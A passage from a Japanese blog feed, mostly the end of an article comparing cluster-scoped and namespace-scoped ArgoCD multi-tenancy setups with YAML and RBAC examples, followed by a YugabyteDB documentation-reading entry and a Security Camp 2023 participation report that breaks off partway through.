CD for Kubernetes05. CLモードなArgoCDCLモードなArgoCDとはCLモードなArgoCDの場合、各テナント間で共有のArgoCDを管理します例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。別途、ArgoCD専用のNamespace (argocd) を用意し、ここに関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesArgoCD: Multi-tenancy strategy. Introduction | by Geoffrey | MediumAppProjectNSモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com  # CLモードでは設定が必要である  sourceNamespaces:    - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。一方で後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。そのため、.spec.sourceNamespacesキーで、特定のNamespaceのApplicationがこのAppProjectに所属できないように、ApplicationのNamespaceを制限しています。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)NSモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # CLモードでは設定が必要である  # 全てのNamespaceを指定したい場合は、ワイルドカードを設定する  application.namespaces: \\"*\\".application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。一方での後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。--application-namespacesオプションで、任意のNamespaceにアクセスするための認可を設定できます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes▶ --application-namespacesオプションの設定方法についてargocd-cmd-params-cmの代わりに、例えば以下のようにPodに引数を直接渡しても良いです\uD83D\uDE46\uD83C\uDFFB‍例えば、以下のような実装になります。apiVersion: v1kind: Podmetadata:  name: argocd-server  namespace: argocdspec:  containers:    - name: argocd-server      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-server        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...apiVersion: v1kind: Podmetadata:  name: argocd-application-controller  namespace: argocdspec:  containers:    - name: argocd-application-controller      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-application-controller        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...  `argocd-application-controller` Command Reference - Argo CD - Declarative GitOps CD for Kubernetes`argocd-server` Command Reference - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)NSモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:foo, *, *, foo/*/*, allow    p, role:bar, *, *, bar/*/*, allow    p, role:baz, *, *, baz/*/*, allow    g, foo-team, role:foo    g, bar-team, role:bar    g, baz-team, role:baz  scopes: \\"[groups]\\"認証済みグループ (foo-team、bar-team、baz-team) に対して、無認可のAppProject (foo、bar、baz) に所属するApplicationを操作できないように、認可スコープを制限しています。▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetesオススメしない理由CLモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 ArgoCD用Clusterの管理者が単一のClusterを保守すればよい。(例：アップグレード、機能修正など)   AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 -                                                                                            ClusterまたはArgoCDで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                            ➡︎  代わりにNodeやArgoCDを十分に冗長化して可用性を高めれば、影響を緩和できる。ただ、そもそもの影響範囲が大きすぎる\uD83D\uDE2D                                           05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはNSモードなArgoCDの場合、前述のCLモードとは異なり、各AppProjectテナント間でArgoCDを占有します。例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。各AppProjectテナントに、ArgoCDと関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesAppProjectCLモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com# NSモードでは設定が不要である# sourceNamespaces:#   - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできます。そのため、.spec.sourceNamespacesキーでマニフェストのデプロイを制限する必要はありません。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)CLモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# NSモードでは設定が不要である# application.namespaces: \\"*\\"前述の通り、.application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできますそのため、.application.namespacesキーでNamespaceに関する認可を設定する必要はありませんもちろん、Podのコンテナ引数にも設定は不要です。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)CLモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"認証済みグループ (app-team、infra-team) に対して、無認可のAppProject (app、infra) に所属するApplicationを操作できないように、認可スコープを制限しています。特にオススメした理由NSモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 単一のClusterを保守すればよい。(例：アップグレード、機能修正など)               AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 テナントごとにArgoCDを占有しており、他のArgoCDから障害の影響を受けない。                     Clusterで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                                        ➡︎  代わりに、Nodeを十分に冗長化して可用性を高める。いずれかのインスタンスで障害が起こっても、正常なインスタンスでArgoCDが稼働できる。                         AppProjectテナント例の一覧NSモードなArgoCDを採用する場合、AppProjectテナント例を解説していきます。前述の通り、AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。なお、オススメするものを ★ としています。    テナント例(二重テナント)    オススメ  Namespace(第一テナント)    AppProject(第二テナント)  テナント例1      プロダクトの実行環境別      プロダクトの実行環境別          テナント例2      プロダクト別      プロダクトの実行環境別      ★    テナント例3      プロダクト別      プロダクトのサブチーム別      ★★    ▶ Namespaceの分割パターンについて\\"管理チーム別\\" (今回でいうプロダクト別) というNamespaceの分割パターンは、様々な著名な書籍やブログで紹介されています\uD83D\uDC40  https://www.amazon.co.jp/dp/1617293725Kubernetes best practices: Specifying Namespaces in YAML | Google Cloud Blogテナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。この場合に、プロダクトの実行環境別にNamespace (dev、tes) とAppProject (dev、tes) を用意します。オススメしなかった理由テナント例1には、以下のメリデメがあります。独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                                                                                                   デメリットの回避策                                                                                       拡張性                 -                                                                                                                                               ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりやすい。その時点で、AppProjectテナントの増やせなくなる。  ➡︎  例えばAWS EKSの場合、Node数を増やしたり、Nodeのスペックを上げる。ただ、お金がかかる\uD83D\uDE2D       安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                             ➡︎  -                                                                                                        保守性                 異なる実行環境に関するApplicationが共存しておらず、別のargocd-serverから操作することになるため、実行環境間の選択ミスが起こりにくい。            -                                                                                                                                             ➡︎  -                                                                                         テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトの実行環境別にAppProject (dev、tes) を用意します。オススメした理由テナント例2には、以下のメリデメがあります。独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                   -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                          異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。特にオススメした理由テナント例3には、以下のメリデメがあります。独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                       デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                                          -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可のサブチーム別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                                                 異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 06. どのような誤った操作を防いでくれるのかそろそろ解説を読むのがしんどい方がいるのではないでしょうか。『君がッ、泣くまで、解説をやめないッ！』AppProjectテナントとNamespacedスコープモードがマニフェストのデプロイをどのように制限するのかについて、例を挙げて解説します。ここでは、以下のAppProjectを作成したと仮定します。AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # appチーム  name: app  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"      # プロダクト用Clusterに関する認可を設定する      # Namespace (app) へのデプロイを許可する    - namespace: app      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comapiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # infraチーム  name: infra  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    # Namespace (infra) へのデプロイを許可する    - namespace: infra      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comマニフェストのデプロイ制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、マニフェストのデプロイを制限します。マニフェストをデプロイできる場合マニフェストを正しくデプロイする場合、AppProjectテナントはこれを制限しません。(1) argocd-serverは、argocd-cmd-params-cmからアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、argocd-serverは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) fooプロダクトのinfraチームが、argocd-serverを操作します。(3) argocd-serverは、argocd-rbac-cmからApplication操作に関する認可スコープを取得しますapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"(4) infraチームは、認可されたAppProjectに所属するApplicationを操作します。(5) infraチームは、Dev環境のfooプロダクト用ClusterのNamespace (infra) にマニフェストをデプロイできます。(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが無認可のNamespace (bar) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。namespace bar is not permitted in project \'infra-team\'無認可のNamespaceでApplicationを作れてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/test/e2e/app_management_ns_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが、無認可のAppProject (app) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。Application referencing project \'app\' which does not exist任意のAppProjectでApplicationを作成できてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のプロダクト用Cluster (bar-cluster) をデプロイ先として指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://bar-cluster.gr7.ap-northeast-1.eks.amazonaws.com infra} is not permitted in project \'infra-team\'任意のClusterをデプロイ先に指定できてしまうと、Applicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のNamespace (app) をデプロイ先に指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com app} is not permitted in project \'infra-team\'任意のNamespaceをデプロイ先に指定できてしまうと、そのApplicationから無認可のNamespaceにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub▶ AppProjectで設定できる認可の種類についてargocd-serverとapplication-controllerでデプロイできるKubernetesリソースの種類 (.spec.clusterResourceWhitelistキー、.spec.namespaceResourceWhitelistキーなど)repo-serverでポーリングできるリポジトリ (.spec.sourceReposキー)apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  clusterResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  namespaceResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  sourceRepos:    - \\"*\\"  ...\\"AppProjectテナントによるマニフェストのデプロイ丸ごとの制限\\" という観点でテーマが異なるため、本記事では言及しませんでした\uD83D\uDE47\uD83C\uDFFB‍  Projects - Argo CD - Declarative GitOps CD for KubernetesDeclarative Setup - Argo CD - Declarative GitOps CD for KubernetesカスタムリソースのReconciliation制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、ArgoCD系カスタムリソースに対するapplication-controllerのReconciliationを制限します。ArgoCD系カスタムリソースをReconciliationできる場合正しいNamespaceに対してReconciliationを実行する場合、AppProjectテナントはこれを制限しません。(1) application-controllerは、argocd-cmd-params-cmから自身がアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、application-controllerは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) application-controllerは、同じNamespaceに所属するArgoCD系カスタムリソースに対して、Reconciliationを実行します。(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合例えば、application-controllerがReconciliationの対象とするNamespaceを選ぼうとしているとします。すると、application-controllerは内部で検証メソッドを実行し、無認可のNamespace (bar) は選ばないようにします。argo-cd/controller/appcontroller_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub07. おわりにKubernetesのマルチテナントパターンとArgoCDでのパターン実践をもりもり布教しました。あらゆる面からマニフェストのデプロイを制限してくれる、AppProjectテナントの素晴らしさが伝わりましたでしょうか。KubernetesのマルチテナントパターンをArgoCDでどう実践するべきか、について困っている方の助けになれば幸いです\uD83D\uDC4D謝辞本記事のタイトルは、私が崇拝しているドメイン駆動設計の書籍 \\"実践ドメイン駆動設計\\" から拝借しました\uD83D\uDE4Fまた、ArgoCDでのパターン実践の収集にあたり、以下の方からの意見も参考にさせていただきました。@toversus26 さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-08-18T02:06:46.000Z","dateMiliSeconds":1692324406000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day5","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/5_core_functions_universe_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-Master serviceを読みました。今回はArchitecture > Core functions > Universe creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Universe creationYugabyteDBのユニバース作成は複数のステップを含む。Start YB-MastersYBユニバース作成の最初のステップはレプリケーションファクターで指定された数だけYB-Masterを作成することである。作成されたYB-Masterはそれぞれを認識している。YB-Masterはユニバース内でユニークなID(UUID)をそれぞれに割り当て、それぞれを認識しあったあとにリーダーエレクションを実行する。このステップの終りにYB-Masterの中のひとつがリーダーとして確立される。Start YB-TServersノードの数だけYB-TServerを起動し、それぞれにマスターのアドレスを渡す。それぞれのYB-TServerはマスターにハートビートを送信し、正常に動作していることを確認する。ハートビートはYB-TServerが現在ホストしているタブレットとその負荷情報についても通信するが、この時点ではタブレットにデータは登録されていない。Examples4ノードからなるYBユニバースにテーブルを作成する場合について考える。テーブルのレプリケーションファクターは3とする。3つのマスターがcreateモードで起動される。これはマスターがすでに起動しているために発生するエラーを防ぐために明示的に実行される。リーダーエレクションを実行し、リーダーを選出する。YB-TServerが起動し、全てのYB-TServerがマスターにハートビートを送信する。","isoDate":"2023-08-16T13:49:19.000Z","dateMiliSeconds":1692193759000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"セキュリティ・キャンプ 2023 参加記","link":"https://moz-security.hatenablog.com/entry/2023/08/15/015853","contentSnippet":"8月7日から8月11日まで開催されたセキュリティ・キャンプの Bクラス（Webセキュリティ）に参加してきたので、やってきたことや感想について、体験記として書き残そうと思う。セキュリティ・キャンプについては、以下のホームページを参照してほしい。今年が20回目の開催で、4年ぶりに対面で行われた。www.ipa.go.jp応募課題まず、セキュリティ・キャンプに参加するには、応募課題を解かなければならない。これに関しては、また別のブログとして、私の答案については出そうと思うが、今までのプログラミング言語やコンテナ技術の利用経験を問われたり、Webにおける脆弱性の検証と調査、Webの標準や実装の調査を行なって、それをレポートとしてまとめ、提出した．応募課題は、下記のURLにある。セキュリティ・キャンプ全国大会2023 応募要項（エントリー） | デジタル人材の育成 | IPA 独立行政法人 情報処理推進機構共通講義共通講義では、行動経済学やXR、国際政治とセキュリティといったものやサイバー犯罪についての講義があった。これらについてはあまり書かないが、日頃勉強している技術的なもの以外の部分について学ぶことができるいい機会であり、新鮮であった。サイバーセキュリティという分野は、法律・犯罪と密接に関連してくるにも関わらず、グレー部分の範囲がとても広くて、どこまでが許されて、どこからがダメなのかという判断が難しい。そのため、ワークショップの形で弁護士や検事の方の考えを知ることができたのはよかった。講義の中でも仰っていたが、私はあくまで技術者であり、法律家ではない。だからこそ、”わかった気にならない”という点は気をつけようと思った。専門講義専門講義では、各クラスによって講義が変わってくる。Bクラスでは、Webセキュリティをテーマにして、講義が構成されている。基本的には４時間の講義で、どれも座学と演習が 1:1 くらいの割合になっており、手を動かしたり、ツールの動きを確認しながらだったため、概念だけでなく、実装も学べたし、何よりも楽しかった。講師の方が一般に公開している資料については一緒に貼っている。1日目B-1 Webプロダクトセキュリティへの誘い最初の講義は、初日の18:30~20:30に行われた。この講義では、プロデューサーがどのような意図を持って講義を構成したか、何を学んでほしいのかというところを整理した。このクラスでは、\\"将来と今の両方を考えて、意思決定ができるリーダーになること\\" を目標としており、その時点でいろいろ考えさせられた．私の感覚では、すごいセキュリティエンジニアというのは、技術のことをたくさん知っていることだったからである．でも、実際に社会に出ると、技術とは違ったベクトルの強さというものが必要だとわかった．これに関しては、 この時点でも納得はしていたが、B-5やB-7の講義を受けた後により強く実感した．技術的な強さだけであれば、5日間ひたすらWebアプリケーションの脆弱性を勉強して、探せばいいが、そのような構成にはなっていない．\\"How と Why を考えながら受講すること\\"というのは念を押されたが、これに関しては、非常に大切なことであり、日頃から意識する必要があると感じた。また、B-2からB-7の講義に関して、自分がどこまでわかっていて、どのようなことを学べそうか、何を習得することを目標にするかというのを考えて、グループワークでお互いに共有した．1つ例を挙げると、B-2の講義に関して、サイバーキルチェーンやActive Directoryはわかるが CI/CDパイプライン を狙った攻撃とはなんなのか、加えて攻撃者はどういう視点とか考えで攻撃を計画するのかというのはわからないから学びたいというのがあった．2日目B-2 開発のプロセスを攻撃者の視点で捉えるこの講義は、2日目の8:30~12:30に行われた．この講義では、なぜ攻撃をするのかというところから始まり、レッドチーム演習の効果やサイバーキルチェーンと攻撃フローについて座学で学んだ．また、仮想環境で攻撃演習を行うことで、実際に攻撃フローを見ることができた．演習で自分で攻撃してみることで、攻撃者の視点というものをより実感することができた．最終的には、防御側ができることを考えたが、攻撃者の視点を持つことで、より深く考えることができた．レッドチーム演習の情報はWebで調べてもあまり出てこないため、その界隈の第一人者の方から、生の声を聞けたのはよかったし、貴重な経験になった．最近、Hack The Boxに取り組めていなかったが，講義を受講して、モチベーションが上がり、また再開した．この講義では、CI/CD環境のセキュリティについても学んだ．オンプレミスからクラウドへと環境の変化はあるが、\\"攻撃方法は変わったとしても、攻撃の流れは変わらない\\"というのが大事な点であった．例えば、攻撃モデルの一つにサイバーキルチェーンがあるが、この考え方はオンプレでもクラウドでも関係なく、有効である．今までCI/CDを狙った攻撃というのは全く想像もつかなかったが Github Actions などの CI/CD Configuration から Credential が漏洩したり、3rd party tool を汚染することで莫大な被害につながるといった CI/CD Pipeline への攻撃もなんとなく理解できた．B-3 クラウドネイティブセキュリティの実践と戦略この講義は、2日目の13:30~17:30に行われた．この講義では、そもそもクラウドネイティブとはなんなのかの説明を受けたのちに、Kubernetesが提供する耐障害性の機能やマイクロサービスのセキュリティについて学んだ．k8sを実際に動かして、アプリケーションのスケーリングの様子などを確認しながら進めることができたのはとてもよかった．また、コンテナから権限掌握→AWSアカウントの侵害という演習を通して、クラウドネイティブ環境を構築・運用するにあたって、どのようなことに気をつけなければならないかといったことを学んだ．k8sのセキュリティモニタリングに関して、eBPFの紹介も少しあった．事前課題や講義を通して、最低限 k8s が動かせるようになったり、提供している一部の仕組みについてはわかったりしたが、まだまだ知らない機能はたくさんあるし、現在進行形で新たな技術が生まれている分野である．たしかにクラウドネイティブ環境の構築・運用は難しいのかもしれないが、技術の面白さというのはとても感じたし、もっともっと学んでいきたいと思った．3日目B-4 Webサービスにおける安全な認証とID連携の実装この講義は、2日目の14:00~18:00に行われた．この講義では、最初に認証・認可の技術であるFIDO, WebAuthn, Passkey, OAuth, OpenID Connect についての用語とそれぞれの用語の関係に関して説明を受けた．各用語は知っているが、説明できるほどの理解はできていなかったため、整理して学ぶことができ、理解できた．また、認証・認可はWebアプリにおいて最もクリティカルな箇所であり,セキュリティも十分に配慮しなければならない．CSRFの発生メカニズムを押さえ、どうすれば防ぐことができOpenID Connectではどのような処理フローになっているのかを学ぶことで、安全な認証・認可を実現する仕組みについて理解できた．その後、パスキーのハンズオンとOpen ID Connectのハンズオンを行なった．ハンズオンでは、プログラムの穴あき部分を埋めることで、ちゃんと機能が実装できているか確認しながらステップアップ形式で進めた．ID連携やパスキーの実装となると、難しいイメージだったが、すでにあるライブラリを使うことで、簡単に実装することができた．一度学んだとしても、使わなければ忘れてしまうため、Webアプリケーションを開発するときに、今回学んだ技術を組み込むことで、さらなる理解と自分で使える技術にしたいと思う．B-5 